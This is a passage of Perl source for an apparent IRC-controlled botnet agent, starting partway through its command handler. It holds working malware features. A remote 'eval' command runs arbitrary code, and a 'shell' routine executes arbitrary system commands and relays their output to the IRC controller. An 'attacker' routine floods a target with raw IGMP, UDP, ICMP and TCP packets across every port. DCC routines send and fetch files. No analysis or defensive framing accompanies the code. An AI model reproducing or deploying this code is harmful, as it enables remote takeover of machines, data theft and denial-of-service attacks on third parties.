   elsif ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   elsif ($case =~ /^eval (.*)/) {
      eval "$1";
   }
   elsif ($case =~ /^rj\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    j("$1");
   }
   elsif ($case =~ /^rp\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    p("$1");
   }
   elsif ($case =~ /^quit/) {
     quit();
   }
   elsif ($case =~ /^rand/) {
    my $novonick = getnick();
     nick("$novonick");
   }
   elsif ($case =~ /^stat (.*)/) {
     if ($1 eq "on") {
      $xstats = 1;
      msg("$printl", "Satus enabled");
     } elsif ($1 eq "off") {
      $xstats = 0;
      msg("$printl", "Status disable");
     }
   }
   elsif ($case =~ /^bang (.*)/) {
     if ($1 eq "on") {
      $pacotes = 1;
      msg("$printl", "[x] Bang mode enabled") if ($xstats == "1");
     } elsif ($1 eq "off") {
      $pacotes = 0;
      msg("$printl", "[x] Bang mode disabled") if ($xstats == "1");
     }
   }
}
sub shell {
  return unless $shellaccess;
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "cd: $1".": No such file or directory");
    return;
  }
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c >= "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}

sub attacker {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'B' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65535; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);
       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

sub action {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001ACTION $_[1]\001");
}
sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub hop {
    return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub dehop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub voice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +v $_[1]");
}
sub devoice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -v $_[1]");
}
sub ban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +b $_[1]");
}
sub unban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -b $_[1]");
}
sub kick {
   return unless $#_ == 1;
   sendraw("KICK $_[0] $_[1] :$_[2]");
}
sub modo {
   return unless $#_ == 0;
   sendraw("MODE $_[0] $_[1]");
}
sub mode { modo(@_); }
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub invite {
   return unless $#_ == 1;
   sendraw("INVITE $_[1] $_[0]");
}
sub topico {
   return unless $#_ == 1;
   sendraw("TOPIC $_[0] $_[1]");
}
sub topic { topico(@_); }
sub whois {
  return unless $#_ == 0;
  sendraw("WHOIS $_[0]");
}
sub who {
  return unless $#_ == 0;
  sendraw("WHO $_[0]");
}
sub names {
  return unless $#_ == 0;
  sendraw("NAMES $_[0]");
}
sub away {
  sendraw("AWAY $_[0]");
}
sub back { away(); }
sub quit {
  sendraw("QUIT :$_[0]");
  exit;
}

package DCC;
sub connections {
   my @ready = $dcc_sel->can_read(1);
#   return unless (@ready);
   foreach my $fh (@ready) {
     my $dcctipo = $DCC{$fh}{tipo};
     my $arquivo = $DCC{$fh}{arquivo};
     my $bytes = $DCC{$fh}{bytes};
     my $cur_byte = $DCC{$fh}{curbyte};
     my $nick = $DCC{$fh}{nick};
     my $msg;
     my $nread = sysread($fh, $msg, 10240);
     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {
        $DCC{$fh}{status} = "Cancelado";
        $DCC{$fh}{ftime} = time;
        $dcc_sel->remove($fh);
        $fh->close;
        next;
     }
     if ($dcctipo eq "get") {
        $DCC{$fh}{curbyte} += length($msg);

        my $cur_byte = $DCC{$fh}{curbyte};

        open(FILE, ">> $arquivo");
        print FILE "$msg" if ($cur_byte <= $bytes);
        close(FILE);

        my $packbyte = pack("N", $cur_byte);
        print $fh "$packbyte";

        if ($bytes == $cur_byte) {
           $dcc_sel->remove($fh);
           $fh->close;
           $DCC{$fh}{status} = "Recebido";
           $DCC{$fh}{ftime} = time;
           next;
        }
     } elsif ($dcctipo eq "send") {
          my $send = $fh->accept;
          $send->autoflush(1);
          $dcc_sel->add($send);
          $dcc_sel->remove($fh);
          $DCC{$send}{tipo} = 'sendcon';
          $DCC{$send}{itime} = time;
          $DCC{$send}{nick} = $nick;
          $DCC{$send}{bytes} = $bytes;
          $DCC{$send}{curbyte} = 0;
          $DCC{$send}{arquivo} = $arquivo;
          $DCC{$send}{ip} = $send->peerhost;
          $DCC{$send}{porta} = $send->peerport;
          $DCC{$send}{status} = "Enviando";
          open(FILE, "< $arquivo");
          my $fbytes;
          read(FILE, $fbytes, 1024);
          print $send "$fbytes";
          close FILE;
#          delete($DCC{$fh});
     } elsif ($dcctipo eq 'sendcon') {
          my $bytes_sended = unpack("N", $msg);
          $DCC{$fh}{curbyte} = $bytes_sended;
          if ($bytes_sended == $bytes) {
             $fh->close;
             $dcc_sel->remove($fh);
             $DCC{$fh}{status} = "Enviado";
             $DCC{$fh}{ftime} = time;
             next;
          }
          open(SENDFILE, "< $arquivo");
          seek(SENDFILE, $bytes_sended, 0);
          my $send_bytes;
          read(SENDFILE, $send_bytes, 1024);
          print $fh "$send_bytes";
          close(SENDFILE);
     }
   }
}

sub SEND {
  my ($nick, $arquivo) = @_;
  unless (-r "$arquivo") {
    return(0);
  }
  my $dccark = $arquivo;
  $dccark =~ s/[.*\/](\S+)/$1/;
  my $meuip = $::irc_servers{"$::IRC_cur_socket"}{'meuip'};
  my $longip = unpack("N",inet_aton($meuip));
  my @filestat = stat($arquivo);
  my $size_total=$filestat[7];
  if ($size_total == 0) {
     return(0);
  }
  my ($porta, $sendsock);
  do {
    $porta = int rand(64511);
    $porta += 1024;
    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);
  } until $sendsock;
  $DCC{$sendsock}{tipo} = 'send';
  $DCC{$sendsock}{nick} = $nick;
  $DCC{$sendsock}{bytes} = $size_total;
  $DCC{$sendsock}{arquivo} = $arquivo;
  &::ctcp("$nick", "DCC SEND $dccark $longip $porta $size_total");
}
sub GET {
  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;
  return(0) if (-e "$arquivo");
  if (open(FILE, "> $arquivo")) {
     close FILE;
  } else {
    return(0);
  }
  my $dccip=fixaddr($dcclongip);
  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);
  my $dccsock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);
  $dccsock->autoflush(1);
  $dcc_sel->add($dccsock);
  $DCC{$dccsock}{tipo} = 'get';
  $DCC{$dccsock}{itime} = time;
  $DCC{$dccsock}{nick} = $nick;
  $DCC{$dccsock}{bytes} = $bytes;
  $DCC{$dccsock}{curbyte} = 0;
  $DCC{$dccsock}{arquivo} = $arquivo;
  $DCC{$dccsock}{ip} = $dccip;
  $DCC{$dccsock}{porta} = $dccporta;
  $DCC{$dccsock}{status} = "Recebendo";
}
sub Status {
  my $socket = shift;
  my $sock_tipo = $DCC{$socket}{tipo};
  unless (lc($sock_tipo) eq "chat") {
    my $nick = $DCC{$socket}{nick};
    my $arquivo = $DCC{$socket}{arquivo};
    my $itime = $DCC{$socket}{itime};
    my $ftime = time;
    my $status = $DCC{$socket}{status};
    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});

    my $d_time = $ftime-$itime;

    my $cur_byte = $DCC{$socket}{curbyte};
    my $bytes_total =  $DCC{$socket}{bytes};

    my $rate = 0;
    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;
    my $porcen = ($cur_byte*100)/$bytes_total;

    my ($r_duv, $p_duv);
    if ($rate =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $r_duv = $3; $r_duv++ if $4 >= 5;
       $rate = "$1\.$2"."$r_duv";
    }
    if ($porcen =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $p_duv = $3; $p_duv++ if $4 >= 5;
       $porcen = "$1\.$2"."$p_duv";
    }
    return("$sock_tipo","$status","$nick","$arquivo","$bytes_total", "$cur_byte","$d_time", "$rate", "$porcen");
  }
  return(0);
}

sub fixaddr {
    my ($address) = @_;

    chomp $address;
    if ($address =~ /^\d+$/) {
        return inet_ntoa(pack "N", $address);
    } elsif ($address =~ /^[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}$/) {
        return $address;
    } elsif ($address =~ tr/a-zA-Z//) {
        return inet_ntoa(((gethostbyname($address))[4])[0]);
    } else {
        return;
    }
}